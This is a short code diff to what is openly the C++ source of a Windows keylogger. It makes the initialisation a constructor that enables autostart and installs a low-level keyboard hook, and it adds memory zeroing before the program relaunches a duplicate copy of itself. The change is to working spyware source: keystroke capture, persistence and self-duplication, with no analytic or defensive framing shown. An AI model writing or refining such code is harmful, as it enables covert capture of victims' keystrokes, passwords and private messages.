@@ -21,7 +21,7 @@ static LRESULT CALLBACK keyboard_hook(int code, WPARAM wparam, LPARAM lparam)
     return CallNextHookEx(logger->hook(), code, wparam, lparam);
 }
 
-void c_keylogger::initialize()
+c_keylogger::c_keylogger()
 {
     set_autostart();
     m_hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_hook, nullptr, 0);
@@ -107,6 +107,8 @@ void c_keylogger::start_duplicate_and_exit() const
 {
     STARTUPINFO start_info{ };
     PROCESS_INFORMATION proc_info{ };
+    SecureZeroMemory(&start_info, sizeof(start_info));
+    SecureZeroMemory(&proc_info, sizeof(proc_info));
 
     CreateProcess(m_duplicate_path.c_str(), nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &start_info, &proc_info);
 
